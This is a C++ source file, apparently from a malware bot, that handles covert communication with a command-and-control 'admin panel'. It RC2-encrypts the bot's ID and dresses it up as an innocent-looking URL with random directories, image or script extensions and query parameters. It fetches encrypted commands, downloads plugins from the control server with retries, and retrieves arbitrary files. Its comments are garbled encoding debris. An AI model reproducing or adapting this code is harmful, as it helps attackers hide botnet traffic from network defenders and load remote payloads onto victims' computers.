#include "core\core.h"
#include "core\socket.h"
#include "core\rand.h"
#include "core\crypt.h"
#include "core\http.h"
#include "core\file.h"
#include "main.h"
#include "adminka.h"

namespace AdminPanel
{

int numAdmin; // current admin number

const int CountSimpleExts = 7;
char* SimpleExts[CountSimpleExts] = { _CT_(".gif"), _CT_(".jpg"), _CT_(".png"), _CT_(".htm"), _CT_(".html"), _CT_(".php"), _CT_(".shtml") };
const int CountParamsExts = 3;
char* ParamsExts[CountParamsExts] = { _CT_(".php"), _CT_(".bml"), _CT_(".cgi") };

Proxy::Connector* connector;

bool Init()
{
	numAdmin = 0;
	if( !Socket::Init() ) return false;
	connector = 0;
	return true;
}

void Release()
{
	if( connector)
		delete connector;
}

bool GetHostAdmin( int type, StringBuilder& host )
{
	int* num = 0;
	const char* config_hosts = 0;
	switch(type)
	{
		case 0: num = &numAdmin; config_hosts = Config::Hosts; break;
		default:
			return false;
	}
	StringBuilder hosts( MaxSizeHostAdmin, DECODE_STRING(config_hosts) );
	StringArray hs = hosts.Split('|');
	if( hs.Count() > 0 )
	{
		if( *num > hs.Count() || *num < 0 ) *num = 0;
		host = hs[*num];
		return true;
	}
	return false;
}

static int CorrectlyInsert( int i, StringBuilder& s, const char* v, int c_v = -1 )
{
	while( i < s.Len() - 1 )
	{
		if( s[i - 1] != '-' && s[i - 1] != '.' && s[i] != '-' && s[i] != '.' )
		{
			s.Insert( i, v, c_v );
			return i;
		}
		i++;
	}
	return -1;
}

// returns position after inserted extension
static int InsertDirectories( StringBuilder& s, int len )
{
	char slash[2];
	slash[0] = '/';
	slash[1] = 0;
	int slashs = Rand::Gen( 1, 4 );
	int p = 0;
	int maxDist = len / slashs; // maximum number of characters after the slash
	for( int i = 0; i < slashs && p < len; i++ )
	{
		p += Rand::Gen( 1, maxDist );
		int pp = CorrectlyInsert( p, s, slash, 1 );
		if( pp < 0 )
			break;
		p = pp + 1;
		len++;
	}
	return p;
}

static int InsertExt( int i, StringBuilder& s, const char** exts, int c_exts )
{
	int n = Rand::Gen(c_exts - 1);
	StringBuilderStack<8> ext( DECODE_STRING(exts[n]) );
	if( i == 0 ) // insert at the end of the line
	{
		s.Cat( ext, ext.Len() );
		return s.Len();
	}
	else
	{
		i = CorrectlyInsert( i, s, ext, ext.Len() );
		if( i < 0 )
			i = s.Len();
		else
			i += ext.Len();
		return i;
	}
}

static void TextToUrl( const char* psw, const StringBuilder& text, StringBuilder& url )
{
	StringBuilder s;
	s += '|';
	s += text;
	s += '|';
	int lenleft = Rand::Gen( 10, 20 );
	int lenright = Rand::Gen( 10, 20 );
	int lenres = s.Len() + lenleft + lenright;
	//������ ����� ������� 24, ����� �������� �� 3 (��� base64 ��� = � �����) � �� 8 (����� ����� � RC2)
	int lenres2 = ((lenres + 23) / 24) * 24 - 1; //�������� 1, ����� ���������� ����� ������ 8
	lenleft += lenres2 - lenres;
	StringBuilder left, right;
	Rand::Gen( left, lenleft );
	Rand::Gen( right, lenright );
	s.Insert( 0, left );
	s += right;
	Mem::Data data;
	data.Copy( s.c_str(), s.Len() );
	EncryptToText( data, url );
	if( Rand::Condition(50) )
	{
		int lendirs = Rand::Gen( url.Len() - 20, url.Len() - 10 ); //�� ����� ����� ����� ���� ����������
		InsertDirectories( url, lendirs );
		InsertExt( 0, url, (const char**)SimpleExts, CountSimpleExts );
	}
	else
	{
		int lendirs = Rand::Gen( url.Len() / 2 - 10, url.Len() / 2 + 10 ); //�� ����� ����� ����� ���� ����������
		int p = InsertDirectories( url, lendirs );
		if( lendirs - p > 0 )
			p = InsertExt( lendirs, url, (const char**)ParamsExts, CountParamsExts );
		char c1[2]; c1[0] = '?'; c1[1] = 0;
		p = CorrectlyInsert( p, url, c1, 1 ); //��������� ?
		p++;
		c1[0] = '&'; //����������� ����������
		char c2[2]; c2[0] = '='; c2[1] = 0;
		int params = Rand::Gen( 1, 4 );
		int lenparams = url.Len() - p;
		int distParam = lenparams / params;
		for( int i = 0; i < params; i++ )
		{
			int p2 = p + Rand::Gen( 1, distParam );
			int p4 = p2 + 1; //������� ���������� ���������
			if( p2 > url.Len() || i == params - 1 )
				p2 = url.Len();
			else
			{
				p2 = CorrectlyInsert( p2, url, c1, 1 );
				p4++;
			}
			if( p2 < 0 ) break;
			int p3 = Rand::Gen( p + 2, p2 - 1 );
			p3 = CorrectlyInsert( p3, url, c2, 1 );
			p = p4 + 1;
			if( p >= url.Len() ) break;
		}
	}
}


//��������� ������ � �������
bool GenUrl( int type, HTTP::Request& request, const StringBuilder& text )
{
	StringBuilderStack<64> host;
	if( GetHostAdmin( type, host ) )
	{
		request.SetHost(host);
		//���������� ���
		StringBuilder url;
		switch( type )
		{
			case 0:
				TextToUrl( DECODE_STRING(Config::Password), text, url );
				break;
			case 1:
				url = text;
				break;
		}
		request.SetFile(url);
		return true;
	}
	return false;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////
/// ������� �������� � ��������� ������ �������
///////////////////////////////////////////////////////////////////////////////////////////////////////////

bool GetCmd( StringBuilder& cmd )
{
	StringBuilder text;
	text += Config::UID;
	HTTP::Request request(connector);
	if( GenUrl( 0, request, text ) )
	{
		DbgMsg( "������: text %s", text );
		DbgMsg( "������: url %s", request.GetUrl(text).c_str() );
		if( request.Get(10000) )
		{
			Mem::Data data;
			if( Decrypt( request.Response(), data ) )
			{
				data.ToString(cmd);
				return true;
			}
		}
	}
	return false;
}

bool LoadPlugin( const char* namePlugin, Mem::Data& plugin )
{
	StringBuilderStack<64> text;
	text += Config::UID;
	text += '|';
	text += _CS_("plugin=");
	text += namePlugin;
	HTTP::Request request(connector);
	DbgMsg( "�������� �������: %s", text.c_str() );
#ifdef ON_PLUGINS_FOLDER
	StringBuilderStack<MAX_PATH> fileName = "c:\\plugins\\";
	fileName += namePlugin;
	if( File::IsExists(fileName) )
	{
		File::ReadAll( fileName, plugin );
		return true;
	}
	else
		return false;
#else
	if( AdminPanel::GenUrl( 0, request, text ) )
	{
		for( int i = 0; i < 10; i++ ) //������ 10 ������� ��������� ������
		{
			StringBuilder u;
			DbgMsg( "%s", request.GetUrl(u).c_str() );
			if( request.Get(5000) )
			{
				if( request.AnswerCode() == 200 )
				{
					if( Decrypt( request.Response(), plugin ) )
					{
						if( plugin.Len() > 0 )
							return true;
					}
				}
				else
					DbgMsg( "��� �������� ������� '%s' ������� HTTP ������ %d", namePlugin, request.AnswerCode() );
			}
			else
				DbgMsg( "������ ���������� ������� ��� �������� ������� '%s'", namePlugin );
			DbgMsg( "�� ������� ��������� ������, ������� ��� ���" );
			Delay(1000);
		}
	}
	return false;
#endif
}

bool LoadFile( const char* url, Mem::Data& data )
{
	HTTP::Request request( AdminPanel::connector );
	request.SetUrl(url);
#ifdef DEBUG_STRINGS
	StringBuilder url2;
	request.GetUrl(url2);
	DbgMsg( "���������� �������: '%s'", url2.c_str() );
#endif
	if( request.Get(5000) )
	{
		if( request.AnswerCode() == 200 )
		{
			data.Copy(request.Response());
			return true;
		}
		else
			DbgMsg( "������ '%s' ������ HTTP ������ %d", url, request.AnswerCode() );
	}
	else
		DbgMsg( "������ ���������� ������� ��� ���� '%s'", url );
	return false;
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool EncryptToBin( const void* data, int c_data, Mem::Data& dst )
{
	if( dst.Copy( data, c_data ) > 0 )
	{
		byte IV[8];
		Rand::Gen( IV, 8 );
		if( Crypt::EncodeRC2( DECODE_STRING(Config::Password), (char*)IV, dst ) )
		{
			dst.Insert( 0, IV, sizeof(IV) );
			return true;
		}
	}
	return false;
}

bool EncryptToText( const void* data, int c_data, StringBuilder& dst )
{
	Mem::Data dstData;
	if( dstData.Copy( data, c_data ) > 0 )
	{
		StringBuilderStack<10> IV;
		Rand::Gen( IV, 8 );
		if( Crypt::EncodeRC2( DECODE_STRING(Config::Password), IV, dstData ) )
		{
			if( Crypt::ToBase64( dstData, dst ) )
			{
				dst.ReplaceChar( '/', '.' );
				dst.ReplaceChar( '+', '-' );
				dst.Insert( 0, IV );
				return true;
			}
		}
	}
	return false;
}

bool Decrypt( const Mem::Data& src, Mem::Data& dst )
{
	char IV[8];
	Mem::Copy( IV, src.Ptr(), sizeof(IV) );
	if(	dst.Copy( 0, sizeof(IV), src ) > 0 )
	{
		if( Crypt::DecodeRC2( DECODE_STRING(Config::Password), IV, dst ) )
		{
			return true;
		}
	}
	return false;
}

}
